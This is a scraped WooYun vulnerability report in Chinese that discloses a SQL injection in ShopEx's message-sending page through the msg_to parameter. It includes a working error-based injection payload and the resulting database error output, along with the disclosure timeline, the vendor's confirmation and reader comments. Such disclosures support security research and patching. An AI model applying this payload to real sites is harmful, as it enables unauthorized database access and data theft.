{"id": 16835, "wybug_id": "wooyun-2012-011931", "wybug_title": "SHOPEX &gt; 4 存在SQL注入漏洞", "wybug_corp": "ShopEx", "wybug_author": "猪猪侠", "wybug_date": "2012-09-08 23:01", "wybug_open_date": "2012-10-23 23:01", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-09-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-09-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-09-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-09-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-10-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-10-23：\t细节向公众公开  简要描述： 未对客户端可控参数进行安全校验，导致存在SQL注入漏洞； 详细说明：  http://www.shopex.com/member-sendMsg.html在处理用户发送信息的时候，msg_to值未进行过滤，导致SQL注入漏洞的产生；具体利用设置msg_to的值为\nggbond' or 1=(select 1 from (select count(*),concat(floor(rand(0)*2),(select @@version))a from information_schema.tables group by a)b)#\n即可爆出数据库版本信息。\nWarning: SELECT member_id FROM sdb_members WHERE uname='ggbond' or 1=(select 1 from (select count(*),concat(floor(rand(0)*2),(select @@version))a from information_schema.tables group by a)b)#' LIMIT 0, 1:Duplicate entry '15.1.38-log' for key 'group_key' in /data/htdocs/www/core/include_v5/AloneDB.php on line 58找不到你填写的用户！\n   漏洞证明：  \n\n   修复方案：  过滤，校验，转义来自客户端的变量；你们比我更擅长；   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2012-09-09 18:14 厂商回复： 改漏洞已经处理提交过，感谢您为shopex安全做的贡献我们会尽快处理非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-09-08 23:19 |    \t\tMetasploit \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:7        | http://www.metasploit.cn/)\t\t \n  @猪猪侠 这个洞太多了，能不能搞个ECSHOP的？    \n     2012-09-08 23:28 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Metasploit 乌云上不是刚有一个么    \n     2012-09-09 11:52 |    \t\t小痞子 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:21        | <xss>alert(\"a\")</xss>￥&@&……dssKhwjcw...)\t\t \n  ..大牛  我也求个 ecshop 的      \n     2012-10-10 00:50 |    \t\tmOon \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 上线非本人，请勿打扰！)\t\t \n  膜拜    \n     2012-10-24 10:39 |    \t\t屌丝王爷 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 心境随和些，处事淡然些。)\t\t \n  @xsser 混个脸熟。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}